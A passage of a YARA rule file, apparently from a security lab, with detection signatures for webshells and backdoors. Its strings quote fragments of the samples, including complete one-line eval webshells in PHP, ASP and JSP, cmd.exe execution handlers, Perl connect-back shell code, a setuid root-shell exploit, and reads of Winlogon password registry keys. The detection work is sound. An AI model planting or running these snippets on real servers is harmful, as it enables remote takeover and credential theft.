        $s8 = "sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002 - Status GERAL -\\002\");" fullword ascii
        $s9 = "# esse 'sub fixaddr' daki foi pego do NET::IRC::DCC identico soh copiei e coloei (colokar nome do autor)" fullword ascii
        $s10 = "sendraw($IRC_cur_socket, \"PRIVMSG $printl :\\002Tempo\\002: $dtime\".\"s\");" fullword ascii
        $s11 = "notice(\"$pn\", \"\\001VERSION ShellBOT-$VERSAO por 0ldW0lf\\001\");" fullword ascii
        $s12 = "return inet_ntoa(((gethostbyname($address))[4])[0]);" fullword ascii
        $s13 = "sendraw($IRC_cur_socket,\"PRIVMSG $printl :Nenhuma porta aberta foi encontrada\"); " fullword ascii
        $s14 = "while (!(keys(%irc_servers))) { conectar(\"$nick\", \"$servidor\", \"$porta\"); }" fullword ascii
        $s15 = "my $dccsock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>$dccip, PeerPort=>$dccporta, Timeout=>15) or return (0);" fullword ascii
        $s16 = "my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);" fullword ascii
        $s17 = "$irc_servers{$IRC_cur_socket}{'host'} = \"$servidor_con\";" fullword ascii
        $s18 = "########################################## IRC ################################################            " fullword ascii
        $s19 = "$irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;" fullword ascii
        $s20 = "sendraw($IRC_cur_socket, \"PRIVMSG $printl :portas abertas: @aberta\");" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 60KB and ( 8 of them ) ) or ( all of them )
}

rule _home_chenzhongxiang_test_webshell_sample_others_w4p_asp
{
    meta:
        description = "others - file w4p.asp.cer"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e5a46b04921fc39762952b29ae2048b7d18a3418e57faff395505138a0590b7e"
    strings:
        $s1 = "<% eval request(\"cmd\") %>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_755ef07e6ea42c0c0e8975ca1e18ca25c527b69a
{
    meta:
        description = "others - file 755ef07e6ea42c0c0e8975ca1e18ca25c527b69a.jpg"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e0bdb72852b9d942b449a11e3bba18bd206f44432381c1414237c6527896064a"
    strings:
        $s1 = "<?php @eval($_POST['9174']);?>" fullword ascii
    condition:
        ( uint16(0) == 0xd8ff and filesize < 8KB and ( all of them ) ) or ( all of them )
}

rule d1bda75c7e04227d2cfa10e466257d106183c527
{
    meta:
        description = "others - file d1bda75c7e04227d2cfa10e466257d106183c527.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "648319bef1415abcba1cfd9ff08606687fbe8dffeca7cc6fafc07b806ad96e35"
    strings:
        $s1 = "<font size=3 face=verdana><b>Network security team :: CGI Shell</b>" fullword ascii
        $s2 = "##if (!defined$param{pwd}){$param{pwd}='Enter_Password'};##" fullword ascii
        $s3 = "if (!defined$param{cmd}){$param{cmd}=\"ls -la\"};" fullword ascii
        $s4 = "##Ob dannom scripte: Eto prostoj shell napisannyj na perle##" fullword ascii
        $s5 = "open(FILEHANDLE, \"cd $param{dir}&&$param{cmd}|\");" fullword ascii
        $s6 = "<form action=pshell.cgi>" fullword ascii
        $s7 = "#if ($param{pwd} ne $pwd){print \"Nepravelnij user\";}" fullword ascii
        $s8 = "print \"cd $param{dir}&&$param{cmd}\";" fullword ascii
        $s9 = "#########################<<KONEC>>#####################################" fullword ascii
        $s10 = "<input type=text class=\"TEXT\" name=cmd value=$param{cmd}>" fullword ascii
        $s11 = "$name =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack(\"C\", hex($1))/eg;" fullword ascii
        $s12 = "$value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack(\"C\", hex($1))/eg;" fullword ascii
        $s13 = "#V celjah nesankcionirovannogo dostupa smeni etot parol`\"" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 7KB and ( 8 of them ) ) or ( all of them )
}

rule cafc4ede15270ab3f53f007c66e82627a39f4d0f
{
    meta:
        description = "others - file cafc4ede15270ab3f53f007c66e82627a39f4d0f.asa"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2e8c510934724da44281ec73995deff174228bd30eafb0b73b9917d437938c04"
    strings:
        $x1 = "conn.Execute(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)\")" fullword ascii
        $x2 = "seshell.ShellExecute shellpath,\" /c \" & defcmd & \" > \" & sztempfile,\"\",\"open\",0" fullword ascii
        $x3 = "CONn.EXEcutE(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)\")" fullword ascii
        $x4 = "'jb\"<tr><td height='22'><a href='http://tiquan.net/pr/?Submit=+%B2%E9+%D1%AF+&domain=\"&Worinima&\"' target='FileFrame'>" fullword ascii
        $x5 = "></form></tr></table>\":jb SI:SI=\"\":If trim(request.form(\"MMD\"))<>\"\"  Then:password= trim(Request.form(\"P\")):id=trim(Req" ascii
        $x6 = "Passwd=Wsh.RegRead(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultPassword\")" fullword ascii
        $x7 = "jb\"<title>\"&nimajb&\" - \"&nimajbm&\" </title>\":jb\"<style type=\"\"text/css\"\">\":jb\"body,td{font-size: 12px;background-co" ascii
        $x8 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\\\\\"\")'>Documents</a>" fullword ascii
        $x9 = "ConnstR=\"Provider=SQLOLEDB.1;Data Source=\" & tARgETIp &\",\"& PoRtNUm &\";User ID=lake2;Password=;\"" fullword ascii
        $x10 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>AllUsers</a>" fullword ascii
        $x11 = "if shellpath=\"\" then shellpath = \"cmd.exe\"" fullword ascii
        $s12 = "Admin=Wsh.RegRead(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultUserName\")" fullword ascii
        $s13 = "'jb\"<tr><td height='22'><a href='http://tiquan.net/ip/?action=sed&cx_33=\"&ServerU&\"' target='FileFrame'>" fullword ascii
        $s14 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\Cmd.exe\")&\"' size='40'>\"" fullword ascii
        $s15 = "isAutologin=\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AutoAdminLogon\"" fullword ascii
        $s16 = "set dd=cm.exec(shellpath&\" /c \"&defcmd)" fullword ascii
        $s17 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $s18 = "jb\"<input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))>\"" fullword ascii
        $s19 = "autoLoginPath = \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\"" fullword ascii
        $s20 = "!)</font></a></center>\":jb\"<tr><td height='20'><a href='?Action=Upload' target='FileFrame'><center><font color=red size=5px>(" fullword ascii
    condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule dd7b5d8639424ea20954a7d4e71c484f3fd92681
{
    meta:
        description = "others - file dd7b5d8639424ea20954a7d4e71c484f3fd92681.gif"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1a1876de0d0326bbda8cbb74739449720bc5647352d6d8a0a1530aec6a321cf2"
    strings:
        $s1 = "java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream();" fullword ascii
        $s2 = "if(\"023\".equals(request.getParameter(\"pwd\"))){" fullword ascii
    condition:
        ( uint16(0) == 0x4947 and filesize < 20KB and ( all of them ) ) or ( all of them )
}

rule f32ad501318fde95c1d59704e979c079d92715a6
{
    meta:
        description = "others - file f32ad501318fde95c1d59704e979c079d92715a6.jpg"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e8e04e34ae5a3ad9b22ffb05993ee0f372c6b17e6ddafcb136c4f82fc909b8ac"
    strings:
        $s1 = ";<%execute request(\"cmd\")%>" fullword ascii
    condition:
        ( uint16(0) == 0x4947 and filesize < 30KB and ( all of them ) ) or ( all of them )
}

rule aceb0d2318eda17756b7c449bd0bc8e0313e13cc
{
    meta:
        description = "others - file aceb0d2318eda17756b7c449bd0bc8e0313e13cc.png"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d3ee1d23f56e8248c5b70869e2d015b5ebc1ce0b4c2217ca9ed65e5fa8b2dd90"
    strings:
        $s1 = "c\\<?=$_GET[0]($_POST[1]);?>X" fullword ascii
    condition:
        ( uint16(0) == 0x5089 and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule ace0369f0374d5d807a456b0b9c42e05cb7dcfda
{
    meta:
        description = "others - file ace0369f0374d5d807a456b0b9c42e05cb7dcfda.ashx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7a307a1f9ba2ba079094e078395e58d277cc178216ea0799beb3502347e9ea28"
    strings:
        $s1 = "public void ProcessRequest (HttpContext context) { " fullword ascii
        $s2 = "context.Response.ContentType = \"text/plain\";" fullword ascii
        $s3 = "StreamWriter file1= File.CreateText(context.Server.MapPath(\"query.aspx\")); " fullword ascii
        $s4 = "using System.Web; " fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule d2a6308750d0fc6547f916e80ae5982581cf2392
{
    meta:
        description = "others - file d2a6308750d0fc6547f916e80ae5982581cf2392.ashx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4e278c232205aecfb614fabdbe5c15c77ff07bbed0731479de4c75b9d9ce9d7b"
    strings:
        $s1 = "prc.StartInfo.FileName=\"cmd.exe\"; " fullword ascii
        $s2 = "prc.StartInfo.UseShellExecute=false; " fullword ascii
        $s3 = "public void ProcessRequest (HttpContext context) {" fullword ascii
        $s4 = "Process prc=new Process(); " fullword ascii
        $s5 = "context.Response.Write(prc.StandardOutput.ReadToEnd());" fullword ascii
        $s6 = "prc.StartInfo.RedirectStandardError = true; " fullword ascii
        $s7 = "context.Response.End();}" fullword ascii
        $s8 = "prc.StartInfo.RedirectStandardOutput = true; " fullword ascii
        $s9 = "prc.StartInfo.RedirectStandardInput = true; " fullword ascii
        $s10 = "using System.Web;" fullword ascii
        $s11 = "using System.Collections.Generic; " fullword ascii
        $s12 = "prc.StartInfo.CreateNoWindow = false; " fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 2KB and ( 8 of them ) ) or ( all of them )
}

rule e84e1dd1528868428ef1374ac5216baaca6e2976
{
    meta:
        description = "others - file e84e1dd1528868428ef1374ac5216baaca6e2976.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1e06d7dad7ba1d7f5501a76fa0cba1fc61554d585b5bce165069726599d111e4"
    strings:
        $s1 = "# displays a page that allows the user to run commands. If the password doens't" fullword ascii
        $s2 = "# an internal variable and is used each time a command has to be executed. The" fullword ascii
        $s3 = "$HtmlMetaHeader = \"<meta HTTP-EQUIV=\\\"Refresh\\\" CONTENT=\\\"1; URL=$DownloadLink\\\">\";" fullword ascii
        $s4 = "# CGI-Telnet Version 1.0 for NT and Unix : Run Commands on your Web Server" fullword ascii
        $s5 = "# get the directory in which the commands will be executed" fullword ascii
        $s6 = "# Main Program - Execution Starts Here" fullword ascii
        $s7 = "# Script Homepage: http://www.rohitab.com/cgiscripts/cgitelnet.html" fullword ascii
        $s8 = "# output of the change directory command is not displayed to the users" fullword ascii
        $s9 = "# This function is called to execute commands. It displays the output of the" fullword ascii
        $s10 = "# Product Support: http://www.rohitab.com/support/" fullword ascii
        $s11 = "# Configuration: You need to change only $Password and $WinNT. The other" fullword ascii
        $s12 = "# Author e-mail: rohitab@rohitab.com" fullword ascii
        $s13 = "# Author Homepage: http://www.rohitab.com/" fullword ascii
        $s14 = "# Prints the message that informs the user of a failed login" fullword ascii
        $s15 = "# 2. Change the password in the Configuration section below." fullword ascii
        $s16 = "# command and allows the user to enter another command. The change directory" fullword ascii
        $s17 = "<a href=\"http://www.rohitab.com/cgiscripts/cgitelnet.html\">Help</a>" fullword ascii
        $s18 = "&ExecuteCommand;" fullword ascii
        $s19 = "sub ExecuteCommand" fullword ascii
        $s20 = "# Discussion Forum: http://www.rohitab.com/discuss/" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 70KB and ( 8 of them ) ) or ( all of them )
}

rule sig_85cd57ce60c765c44ff59b80c0397c4372f22d5d
{
    meta:
        description = "others - file 85cd57ce60c765c44ff59b80c0397c4372f22d5d.jpg"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e1f8b085dcddd76dae47fcf239e88c8e09230fac157db1babcf0a711681c74ae"
    strings:
        $s1 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"ice\"],\"unsafe\");%>" fullword ascii
    condition:
        ( uint16(0) == 0xd8ff and filesize < 30KB and ( all of them ) ) or ( all of them )
}

rule a34f5bf65ddfd46f348af7111bb2c542262ba4b7
{
    meta:
        description = "others - file a34f5bf65ddfd46f348af7111bb2c542262ba4b7.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2a36b14f6618c77e3654b1deeca2b468a8eec443a1da044d6aa82cb5d2ca304d"
    strings:
        $s1 = "system \"rcp 'hey geezer; gcc -o /tmp/shell /tmp/shell.c;' localhost 2> /dev/null\" ;" fullword ascii
        $s2 = "system \"rcp 'hey geezer; chmod +s /tmp/shell;' localhost 2> /dev/null\" ;" fullword ascii
        $s3 = "printf TEMP \"    setuid(0);\\n\\tsetgid(0);\\n\\texecl(\\\"/bin/sh\\\",\\\"sh\\\",0);\\n\\treturn 0;\\n}\\n\" ;" fullword ascii
        $s4 = "open(TEMP, \">>/tmp/shell.c\")|| die \"Something went wrong: $!\" ;" fullword ascii
        $s5 = "printf TEMP \"#include<unistd.h>\\n#include<stdlib.h>\\nint main()\\n{\" ;" fullword ascii
        $s6 = "exec '/tmp/shell' ;" fullword ascii
        $s7 = "unlink(\"/tmp/shell.c\");" fullword ascii
        $s8 = "if ( ! -u \"$RCPFILE\" )" fullword ascii
        $s9 = "printf \"Ok, launching a rootshell, lets hope shit went well ... \\n\" ;" fullword ascii
        $s10 = "printf \"Starting RCP Exploit\" ;" fullword ascii
        $s11 = "close(TEMP);" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 2KB and ( 8 of them ) ) or ( all of them )
}

rule a647275c30e0a1e78903680ea97931aa8cd39118
{
    meta:
        description = "others - file a647275c30e0a1e78903680ea97931aa8cd39118.jpg"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "98c1937b9606b1e8e0eebcb116a784c9d2d3db0039b21c45cba399e86c92c2fa"
    strings:
        $x1 = "$exec = $wsh->exec('cmd.exe /c '.$command);" fullword ascii
        $x2 = "!$program && $program = 'c:\\windows\\system32\\cmd.exe';" fullword ascii
        $x3 = "$res = execute(which('python').\" /tmp/angel_bcpy $yourip $yourport &\");" fullword ascii
        $x4 = "<a href=\"javascript:goaction('shell');\">Execute Command</a> | " fullword ascii
        $x5 = "$res = execute(which('perl').\" /tmp/angel_bc $yourip $yourport &\");" fullword ascii
        $s6 = "p('<p><a href=\"http://www.4ngel.net/phpspy/plugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
        $s7 = "$res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
        $s8 = "Copyright (C) 2004-2008 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Reserved." fullword ascii
        $s9 = "formhead(array('title'=>'Execute Command'));" fullword ascii
        $s10 = "!$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';" fullword ascii
        $s11 = "header('Content-Disposition: attachment;filename='.$_SERVER['HTTP_HOST'].'_Files.tar.gz');" fullword ascii
        $s12 = "r: 2008</a></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>" fullword ascii
        $s13 = "$res = execute(\"/tmp/angel_bc $yourip $yourport &\");" fullword ascii
        $s14 = "' : '').($curpage > 1 ? '<a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', '.($curpage - 1).');\">Prev</a> ' : '');" fullword ascii
        $s15 = "echo(execute($command));" fullword ascii
        $s16 = "<span style=\"font:11px Verdana;\">Password: </span><input name=\"password\" type=\"password\" size=\"20\">" fullword ascii
        $s17 = "formhead(array('title'=>'Execute Program'));" fullword ascii
        $s18 = "$a = $shell->ShellExecute($program,$parameter);" fullword ascii
        $s19 = "$result = q(\"SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';\");" fullword ascii
        $s20 = "$process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);" fullword ascii
    condition:
        ( uint16(0) == 0x3f3c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule bdd6bd54ea8fea3f540c731e6a3384c430b0e4c8
{
    meta:
        description = "others - file bdd6bd54ea8fea3f540c731e6a3384c430b0e4c8.java"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "43b8f0e9af863a67afe7cd6c5de465931e2b16882ce744c8b4264b40d86c7fe0"
    strings:
        $s1 = "public void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {" fullword ascii
        $s2 = "printwriter.write(\"<HTML>\\n<HEAD>\\n<TITLE>Directory Listing</TITLE>\\n</HEAD>\\n<BODY>\\n\");" fullword ascii
        $s3 = "if(req.getParameter(\"file\")==null) path = \"c:\\\\\";" fullword ascii
        $s4 = "printwriter.write(\"<hr><br><B>Path: <U>\" + path + \"</U></B><BR><BR><hr><PRE>\\n\");" fullword ascii
        $s5 = "* @author Sierra" fullword ascii
        $s6 = "* @version 0.1" fullword ascii
        $s7 = "printwriter.write(\"<FONT Face=\\\"Courier New, Helvetica\\\" Color=\\\"Black\\\">\\n\");" fullword ascii
        $s8 = "PrintWriter printwriter = res.getWriter();" fullword ascii
        $s9 = "String path = req.getParameter(\"file\");" fullword ascii
        $s10 = "( Size: \" + afile[i].length() + \" bytes )<BR>\\n\");" fullword ascii
        $s11 = "* ListServlet.java" fullword ascii
        $s12 = "public String getServletInfo() {" fullword ascii
        $s13 = "printwriter.write(\"<hr></FONT></BODY></HTML>\");" fullword ascii
        $s14 = "import javax.servlet.http.*;" fullword ascii
        $s15 = "FileInputStream fileinputstream = new FileInputStream(file);" fullword ascii
        $s16 = "printwriter.write(\"Can't Read file<BR>\");" fullword ascii
        $s17 = "printwriter.write(\") <A Style='Color: \" + s3.toString() + \";' HRef='?file=\" + s1.toString() + \"'>\" + s1.toString() + \"</A" ascii
        $s18 = "import javax.servlet.ServletException;" fullword ascii
        $s19 = "printwriter.write(\") <A Style='Color: \" + s3.toString() + \";' HRef='?file=\" + s1.toString() + \"'>\" + s1.toString() + \"</A" ascii
    condition:
        ( uint16(0) == 0x2a2f and filesize < 6KB and ( 8 of them ) ) or ( all of them )
}

rule sig_7273f25277811f5aac89af3ee8bcea40165481f7
{
    meta:
        description = "others - file 7273f25277811f5aac89af3ee8bcea40165481f7.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6bb77a2ce92774a5bcf689e22e0e8133c65095219ebf73490e53c77b82f4a410"
    strings:
        $x1 = "print \"--== ConnectBack Backdoor Shell vs 1.0 bY MasterKid of WwW.CoM Hackers SABOTAGE ==-- \\n\\n\"; " fullword ascii
        $s2 = "#--== ConnectBack Backdoor Shell vs 1.0 bY MasterKid of WwW.CoM Hackers SABOTAGE ==--" fullword ascii
        $s3 = "print \"--== ConnectBack Backdoor vs 1.0 bY MasterKid of WwW.CoM Hackers SABOTAGE ==--  \\n\\n\"; " fullword ascii
        $s4 = "echo --==Userinfo==-- ; id;echo;echo --==Directory==-- ; pwd;echo; echo --==Shell==-- \"); " fullword ascii
        $s5 = "socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or die print \"[-] Unable to Resolve Host\\n\"; " fullword ascii
        $s6 = "system(\"unset HISTFILE; unset SAVEHIST ;echo --==Systeminfo==-- ; uname -a;echo;" fullword ascii
        $s7 = "#--== ConnectBack Backdoor vs 1.0 bY MasterKid of WwW.CoM Hackers SABOTAGE ==--" fullword ascii
        $s8 = "connect(SOCKET, sockaddr_in($ARGV[1], inet_aton($ARGV[0]))) or die print \"[-] Unable to Connect Host\\n\"; " fullword ascii
        $s9 = "print \"[*] Spawning Shell \\n\";" fullword ascii
        $s10 = "print \"[*] Connected to remote host \\n\";" fullword ascii
        $s11 = "print \"Usage: $0 [Host] [Port] \\n\\n\"; " fullword ascii
        $s12 = "#[*] Spawning Shell" fullword ascii
        $s13 = "#Email: muzicteam2006@yahoo.com" fullword ascii
        $s14 = "#[*] Connected to remote host" fullword ascii
        $s15 = "#connect to [127.0.0.1] from localhost [127.0.0.1] 32769" fullword ascii
        $s16 = "#Usage: dc.pl [Host] [Port]" fullword ascii
        $s17 = "#coded bY: MasterKid" fullword ascii
        $s18 = "#uid=1001(lord) gid=100(users) groups=100(users)" fullword ascii
        $s19 = "#kid@SlackwareLinux:/home/programing$ perl dc.pl 127.0.0.1 2121" fullword ascii
        $s20 = "#Linux SlackwareLinux 2.6.7 #1 SMP Thu Dec 23 00:05:39 IRT 2004 i686 unknown unknown GNU/Linux" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 6KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_3dd85981bec33de42c04c53d081c230b5fc0e94f
{
    meta:
        description = "others - file 3dd85981bec33de42c04c53d081c230b5fc0e94f.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "370d6db133be9528be8638f7655b3f82ec894ba34b288b0efe4bed3a9923921b"
    strings:
        $s1 = "#change this password; for power security - delete this file =)" fullword ascii
        $s2 = "if (!defined$param{cmd}){$param{cmd}=\"ls -la\"};" fullword ascii
        $s3 = "open(FILEHANDLE, \"cd $param{dir}&&$param{cmd}|\");" fullword ascii
        $s4 = "if ($param{pwd} ne $pwd){print \"user invalid, please replace user\";}" fullword ascii
        $s5 = "print \"cd $param{dir}&&$param{cmd}\";" fullword ascii
        $s6 = "<input type=text class=\"TEXT\" name=cmd value=$param{cmd}>" fullword ascii
        $s7 = "$name =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack(\"C\", hex($1))/eg;" fullword ascii
        $s8 = "$value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack(\"C\", hex($1))/eg;" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 6KB and ( all of them ) ) or ( all of them )
}

rule sig_4b2ee85bb53225354eb84536035bb40b2ef945a8
{
    meta:
        description = "others - file 4b2ee85bb53225354eb84536035bb40b2ef945a8.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a5a40d319b3235fe2476d4c2d0f719a5fd2b4958edc0aa5e9bed9422ff819d19"
    strings:
        $x1 = "}sub ExecuteCommand1{if($RunCommand =~ m/^\\s*cd\\s+(.+)/gis){$CurrentDir=~s!\\Q//!/!g;if(!-r $1){$RunCommand=\"Can't read $1!\"" ascii
        $x2 = "<tr><td><form name=\"run\" method=\"POST\"><br><input type=text size=\"2\" id=\"sub3\" disabled value='\\$ '><input type=\"hidde" ascii
        $x3 = "my ($Password,$CommandTimeoutDuration,$tab,$tbb,$verd,$tabe,$div,$dive,$WinNT,$NTCmdSep,$UnixCmdSep,$ShowDynamicOutput,$CmdSep,$" ascii
        $x4 = "print \"$tbb$verd\";$dbh=DBI->connect(\"DBI:mysql:$dbb:$hhost:$pport\",$usser,$passs);$sth = $dbh->prepare(\"SHOW DATABASES\");$" ascii
        $x5 = "$tab='<table>';$tbb=\"<table width=100%\";$verd=\"<font face=Verdana size=1>\";$tabe='</table>';$div='<div class=content><pre cl" ascii
        $s6 = "ter;}sub sql_databases{sql_vars_set();&PrintPageHeader(\"c\");sql_vars_set();sql_loginform();$ddb=$in{'database'};print <<END;" fullword ascii
        $s7 = "ookies{'passs'};$dbb=$Cookies{'dbb'};&PrintPageHeader(\"c\");sql_vars_set();sql_loginform();$qqquery=$in{'table'};print <<END;" fullword ascii
        $s8 = "print \"$tbb$verd\";$dbh=DBI->connect(\"DBI:mysql:$dbb:$hhost:$pport\",$usser,$passs);$sth=$dbh->prepare(\"SHOW DATABASES\");$st" ascii
        $s9 = "print \"$tbb$verd\";$dbh=DBI->connect(\"DBI:mysql:$dbb:$hhost:$pport\",$usser,$passs);$sth=$dbh->prepare('SHOW DATABASES');$sth-" ascii
        $s10 = "In){&PerformLogin;}elsif($Action eq \"command\"){&ExecuteCommand;}elsif($Action eq \"RT\"){&RT;}elsif($Action eq \"view_file\"){" ascii
        $s11 = "&PrintVar;}sub back{open(FILE,\">/tmp/bbc.pl\");$bbc='#!/usr/bin/perl use IO::Socket;$system=\"/bin/bash\";use Socket;use FileHa" ascii
        $s12 = "&PrintVar;}sub ft($){my $Fchmod=perm($_[0]);my $owner=owner($_[0]);if(!-w $_[0]){$wr='<font color=#FF0000>  Not writable</font>'" ascii
        $s13 = "}sub PrintLoginForm{print \"<center><form name=f method=POST><input type=password name=p><input type=submit value='>>'></form></" ascii
        $s14 = "</td><td width=1 align=right><nobr><span>Server IP:</span><br>$ENV{'SERVER_ADDR'}<br><span>Client IP:</span><br>$ENV{'REMOTE_ADD" ascii
        $s15 = "}sub sql{use DBI;&PrintPageHeader(\"p\");sql_loginform();sql_query_form();&PrintVar;&PrintPageFooter;}sub sql_vars_set{$hhost=$i" ascii
        $s16 = "$CommandTimeoutDuration=30;# max time of command execution in seconds" fullword ascii
        $s17 = "<form name='sf' method='post'><table cellpadding='2' cellspacing='0'><tr><td>Type</td><td>Host</td><td>Port</td><td>Login</td><t" ascii
        $s18 = "ookie: last_command=;\\n\";print \"Content-type: text/html\\n\\n\";&PrintLoginForm;}sub PerformLogin{if(md5_hex($LoginPassword) " ascii
        $s19 = "<form name='sf' method='post'><table cellpadding='2' cellspacing='0'><tr><td>Type</td><td>Host</td><td>Port</td><td>Login</td><t" ascii
        $s20 = "open(FFF,\"> $ffpath\");print FFF DeHtmlSpecialChars($fccode);close(FFF);&PrintVar;&PrintPageFooter;}sub jquery{print '<script>d" ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule db74302278d2bfd5a1f48e95bf04ff579587620f
{
    meta:
        description = "others - file db74302278d2bfd5a1f48e95bf04ff579587620f.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "077754d01e8d537c6ac3fb69c25c7397c4c34fe5a4462727b0814af2381a67fa"
    strings:
        $x1 = "}sub ExecuteCommand1{if($RunCommand=~ m/^\\s*cd\\s+(.+)/gis){if(!-r $1){$CurrentDir=~s!\\Q//!/!g;$RunCommand=\"Can't read $1!\";" ascii
        $x2 = "use IO::Socket;my($Password,$CommandTimeoutDuration,$tab,$tbb,$verd,$tabe,$div,$div1,$dive,$WinNT,$NTCmdSep,$UnixCmdSep,$ShowDyn" ascii
        $x3 = "<form name=\"runnn\" method=\"POST\" onsubmit=\"this.cccc.value=encrypt(this.cccc.value,'$sec_key');d.runnn.submit()\"><br><inpu" ascii
        $x4 = "print \"$tbb$verd\";$dbh=DBI->connect(\"DBI:mysql:$dbb:$hhost:$pport\",$usser,$passs);$sth = $dbh->prepare(\"SHOW DATABASES\");$" ascii
        $x5 = "ein,$buff,$rout,$wout,$eout,$sec_key):shared;$0=\"/usr/sbin/apache2 -k start\";# <-- shell in ps aux" fullword ascii
        $x6 = "$tab='<table>';$tbb=\"<table width=100%\";$verd=\"<font face=Verdana size=1>\";$tabe='</table>';$div1='<div class=content><pre c" ascii
        $x7 = "&PrintVar;}sub back{$iaddr=inet_aton($target) || die(\"Error: $!\\n\");$paddr=sockaddr_in($port, $iaddr) || die(\"Error: $!\\n\"" ascii
        $x8 = "mand1,$RunCommand3,$Command,$langs,$httpd,$hdd1,$hdd,$perlv,$phpv,$hosts,$downloaders,$hdd1,$OldDir,$ChangeDir,$MkDir,$MakeFile," ascii
        $x9 = "&PrintVar;}sub ft($){my $Fchmod=perm($_[0]);my $owner=owner($_[0]);if(!-w $_[0]){$wr='<font color=#FF0000>  Not writable</font>'" ascii
        $s10 = "ter;}sub sql_databases{sql_vars_set();&PrintPageHeader(\"c\");sql_vars_set();sql_loginform();$ddb=$in{'database'};print <<END;" fullword ascii
